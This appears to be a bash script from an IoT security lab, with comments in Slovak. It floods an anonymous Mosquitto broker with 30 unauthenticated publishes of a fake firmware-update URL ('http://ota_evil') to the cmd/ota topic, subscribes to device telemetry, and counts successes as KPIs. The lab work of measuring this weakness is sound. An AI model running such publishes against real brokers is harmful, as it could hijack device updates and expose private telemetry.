#!/usr/bin/env bash
# MQTT Baseline útok – 30 publish pokusov bez autentifikácie
# Metodika kap. 3.11: KPI = počet úspešných neautorizovaných PUBLISH operácií
# Očakávaný výsledok: USPECH (broker allow_anonymous=true, port 1883)
# Spustiť po: docker compose up -d  (bez mqtt-secure overlayu)
# Optimalizácia: celý loop v jedinom docker exec (10-20× rýchlejšie)
set -euo pipefail
cd "$(dirname "$0")/.."

RUN_ID=$(grep '^RUN_ID=' .env | cut -d= -f2)
LOGF="runs/${RUN_ID}/logs/attacks.log"
TOTAL=30

echo "=== MQTT BASELINE ATTACK (${TOTAL} pokusov) ==="
echo ""
echo "[1] Attacker posiela ${TOTAL}x neautorizovany publish na port 1883..."

# Batch: celý loop prebehne v jedinom docker exec (eliminuje ~0.5s per-exec overhead)
set +e
RESULT=$(docker compose exec -T attacker sh -c '
  count=0
  for i in $(seq 1 30); do
    mosquitto_pub -h mosquitto -p 1883 -t cmd/ota -m "http://ota_evil?attempt=$i" 2>/dev/null \
      && count=$((count+1)) || true
  done
  echo $count
' 2>/dev/null)
set -e
SUCCESS=${RESULT:-0}

for i in $(seq 1 "${SUCCESS}"); do echo "P1_mqtt_unauth_success 1" >> "$LOGF"; done
echo ">>> ${SUCCESS}/${TOTAL} publish operacii uspesnych (KPI: P1_mqtt_unauth_success=${SUCCESS})"

echo ""
echo "[2] Attacker odpocuva telemetriu DUT (subscribe)..."
docker compose exec -T attacker \
  mosquitto_sub -h mosquitto -p 1883 -t "telemetry/#" -C 1 -W 5 \
  && echo ">>> USPECH – subscribe funguje (DUT telemetria dostupna)" \
  || echo ">>> Subscribe timeout (DUT este nezacal publikovat – OK)"

echo ""
echo "=== VYSLEDOK: ${SUCCESS}/${TOTAL} pokusov uspesnych (zranitelnost potvrdena) ==="
